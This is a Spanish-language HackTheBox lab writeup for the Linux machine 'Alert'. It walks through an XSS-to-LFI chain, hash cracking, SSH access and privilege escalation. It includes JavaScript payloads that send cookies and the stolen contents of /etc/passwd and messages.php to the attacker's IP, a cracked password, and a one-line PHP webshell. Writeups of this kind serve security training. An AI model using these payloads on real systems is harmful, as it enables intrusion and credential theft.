---
title: "Alert"
date: 2025-03-25 10:16:11 +0100
categories: writeups hackthebox
tags: máquina linux autopwned lfi xss rce criptografía
description: Writeup de la máquina Alert de HackTheBox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

**Alert** es una máquina **Linux** de dificultad **Fácil** en **HackTheBox**. Se inicia con la enumeración de puertos, identificando un servidor web vulnerable. Se explota una vulnerabilidad **XSS** para obtener **LFI** y acceder a archivos sensibles. Luego, se extraen credenciales desde un archivo **.htpasswd**, permitiendo el acceso como el usuario **albert** por SSH. Finalmente, se abusa de un grupo con privilegios especiales para ejecutar un **chmod** en **/bin/bash**, logrando una shell privilegiada y obteniendo acceso **root**.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323140842.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.44`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.44 -oG allPorts
```

Observamos como nos reporta que tan solo se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323140805.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.44 -oN targeted
```

En el segundo escaneo de **Nmap**, lo único que nos llamará la atención es el dominio **alert.htb**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141107.png>)

___
### Puerto 80 - HTTP (Apache)

Para acceder a la página web, debemos añadir la siguiente línea `10.10.11.44 alert.htb` al archivo `/etc/hosts`. Una vez editado, podremos ver el contenido de la página, donde notaremos que es posible subir archivos **Markdown** para posteriormente, visualizarlos.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141146.png>)

En la sección **About Us**, se indica que el usuario administrador revisa los mensajes enviados a través de **Contact Us**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141241.png>)

En este punto, montaremos un servidor con Python (`python3 -m http.server 80`) y verificaremos si el usuario administrador realmente revisa los mensajes. Para ello, enviaremos un mensaje con la siguiente estructura.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141326.png>)

Tal como vemos a continuación, nos llegará una petición desde la máquina víctima, por lo que comprobamos que el usuario administrador está revisando los mensajes enviados en **Contact Us**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141352.png>)

En este punto, lo que haremos será crear un archivo llamado `pwned.md` con el siguiente contenido.

```md
<h1>Testing</h1>
```

Subiremos dicho archivo (`pwned.md`) a la web y veremos que interpreta el código **HTML**. Además, aparecerá un enlace para compartir el archivo.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141518.png>)

Cambiaremos el contenido de `pwned.md` por el siguiente.

```md
<script>alert("Se está ejecutando javascript")</script>
```

Al subir el archivo, veremos que interpreta el código **JavaScript**, por lo que es vulnerable a un ataque **XSS**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141644.png>)

Actualizaremos el contenido de `pwned.md` con el siguiente código para comprobar si es capaz de realizar una petición a un recurso externo.

```md
<script src="http://10.10.16.51/pwned.js"></script>
```

Al subir el archivo `pwned.md`, se generará un enlace, el cual enviaremos al usuario administrador a través de la sección **Contact Us**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141840.png>)

Tras habernos montado previamente un servidor con Python (`python3 -m http.server 80`), veremos cómo recibimos una petición al recurso `pwned.js`.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141857.png>)

Una vez que hemos comprobado que el usuario administrador es capaz de acceder a recursos externos (`pwned.js`), actualizaremos el contenido del recurso interno con el siguiente código para intentar un **Cookie Hijacking**.

```js
let req = new XMLHttpRequest();
req.open("GET", "http://10.10.16.51/?cookie="+document.cookie)
req.send()
```

Volveremos a enviar el mismo enlace al usuario administrador y veremos cómo no podemos secuestrar su cookie, ya que no se están utilizando.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323191929.png>)

En este punto, como nos hemos quedado sin opciones, realizaremos un escaneo haciendo uso de **Gobuster** de la siguiente forma.

```bash
gobuster dir -u http://alert.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100
```

Entre todos los ficheros `.php` que nos descubre, nos llamará la atención el `messages.php`.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192045.png>)

Accederemos a `messages.php` utilizando el parámetro que se pasa por **GET**, es decir, `?page=messages`, pero veremos que la página vacía. Pensaremos que solo el usuario administrador tiene permiso para verla.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192116.png>)

___
## Explotación
### XSS → LFI

A partir del **XSS** que hemos encontrado, modificaremos el contenido de `pwned.js` para poder leer el contenido de `messages.php`.

```js
let req = new XMLHttpRequest();
req.onload=function(){let img = new Image(); img.src="http://10.10.16.51/?content="+btoa(this.responseText)}
req.open("GET", "http://alert.htb/index.php?page=messages")
req.send()
```

Tal y como vemos a continuación, nos llegará una petición de nuestra **Dirección IP** con menos contenido que la de **Dirección IP** de la máquina víctima.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192638.png>)

Decodificaremos el contenido recibido en nuestra petición (`echo -n '<base64-content>' | base64 -d | cat -l html`), pero no veremos nada diferente a lo que ya veíamos en la página web.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192656.png>)

A continuación, decodificaremos el contenido recibido en la petición de la **Dirección IP** de la máquina víctima, y veremos un hipervínculo el cual se encarga de acceder a un archivo de la máquina víctima mediante el parámetro `file`.


![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192559.png>)

Modificaremos nuestro archivo `pwned.js` para poder visualizar el contenido de la siguiente página, `http://alert.htb/messages.php?file=../../../../etc/passwd`.

```js
let req = new XMLHttpRequest();
req.onload=function(){let img = new Image(); img.src="http://10.10.16.51/?content="+btoa(this.responseText)}
req.open("GET", "http://alert.htb/messages.php?file=../../../../etc/passwd")
req.send()
```

Tras enviar el enlace al usuario administrador, veremos que efectivamente se produce un **LFI** , lo que nos permitirá ver el contenido de `/etc/passwd` de la máquina víctima.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193003.png>)

>[!INFO]
>En este punto, podríamos intentar leer las claves `id_rsa` de los usuarios **albert** y **david**, pero lo intentaríamos sin éxito.

Como recordamos, se estaba usando **apache2** como servidor **HTTP**, por lo que intentaremos leer su archivo de configuración (`/etc/apache2/sites-available/000-default.conf`). 

Como podemos ver, encontraremos un subdominio (`statistics.alert.htb`), en el cual se está utilizando una autenticación de tipo **Basic**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193308.png>)

Añadiremos este nuevo subdominio al archivo `/etc/hosts`, y al acceder a él veremos que nos solicita unas credenciales para poder ingresar.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193343.png>)

En este punto, intentaremos leer el contenido del archivo `/var/www/statistics.alert.htb/.htpasswd`, ya que en él suele encontrarse un **nombre de usuario** y **contraseña**.

Al leer el contenido de dicho fichero, veremos que un nombre de usuario (**albert**) y un hash.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193435.png>)
### Cracking Hash

Haciendo uso de **hashcat**, crackearemos el hash gracias al siguiente comando.

```bash
hashcat hash /usr/share/wordlists/rockyou.txt --user
```

Veremos que nos encuentra una contraseña, **manchesterunited**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193556.png>)

Intentaremos logearnos en dicho panel con las credenciales encontradas (**albert:manchesterunited**).

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193622.png>)

"Conseguiremos acceder correctamente al panel, donde veremos un montón de correos electrónicos.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193644.png>)

Como recordamos, el puerto **22** (**ssh**) estaba abierto. Además, al leer el contenido de `/etc/passwd`, vimos que existía un usuario llamado **albert**, por lo que intentaremos conectarnos a través de **ssh** de la siguiente forma.

```bash
ssh albert@10.10.11.44 # Password: manchesterunited
```

Nos conectaremos correctamente por lo que habremos ganado acceso a la máquina víctima, además cambiaremos nuestra variable de entorno **TERM** (`export TERM=xterm`) para poder limpiar la pantalla, es decir poder hacer un <kbd>CTRL</kbd>+<kbd>L</kbd>.

___
## Escalada de privilegios
### Enumeración local

Una vez hemos ganado acceso a la máquina víctima, listaremos nuestros permisos de **Sudoers**, pero veremos que no tenemos ninguno.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193812.png>)

También, listaremos los permisos **SUID**, pero tampoco encontraremos nada interesante.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193827.png>)

Si miramos los grupos a los que pertenecemos, nos llamará la atención el grupo **management**, ya que es algo inusual.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193904.png>)

Buscaremos archivos que tengan como propietario al grupo **management** y encontraremos un directorio ubicado en `/opt/website-monitor/config`.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193948.png>)

Si examinamos los procesos en ejecución y filtramos por el nombre del directorio (`ps -aux | grep website-monitor`), veremos que la aplicación ubicada en `/opt/website-monitor` está desplegada en el puerto **8080** por el usuario **root**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194126.png>)

Si revisamos los puertos abiertos en la máquina víctima (`netstat -ntlp`), podemos confirmar que el puerto **8080**, perteneciente a `/opt/website-monitor`, está abierto internamente.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194159.png>)

Para poder ver el contenido de la página web, realizaremos un **Local Port Forwarding** utilizando **ssh**. Para ello, debemos conectarnos a la máquina víctima con el siguiente comando.

```bash
ssh albert@alert.htb -L 8080:localhost:8080
```

Al acceder a nuestro `localhost:8080`, veremos el contenido alojado en el puerto **8080** de la máquina víctima.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194316.png>)
### Abuso de grupos especiales (management)

Si revisamos los permisos que tenemos sobre las carpetas de `/opt/website-monitor`, veremos que tenemos capacidad de escritura sobre la carpeta `/config` y `/monitors`.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194437.png>)

En este punto, lo que haremos será crear un archivo **.php** en alguna de estas dos carpetas. Para ello, utilizaremos el siguiente comando.

```bash
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
```

Posteriormente, accederemos a dicho archivo a través de la página web y veremos que tenemos ejecución remota de comandos (**RCE**) como el usuario **root**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194559.png>)

Para elevar nuestros privilegios asignaremos permiso **SUID** a la **/bin/bash**. Para ello, debemos de ejecutar lo siguiente, `chmod u+s /bin/bash`. 

>[!IMPORTANT]
>En el caso de que el anterior comando nos de un error, ejecutaremos un `chmod 4777 /bin/bash`.

Finalmente, nos ejecutaremos una **bash privilegiada** con `bash -p`, por lo que nos habremos convertido en **root** de forma efectiva (**efective user**).

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194834.png>)

>[!INFO]
>Alternativamente podíamos habernos mandado una **Reverse Shell** o introducir nuestra clave pública en `/root/.ssh/authorized_keys`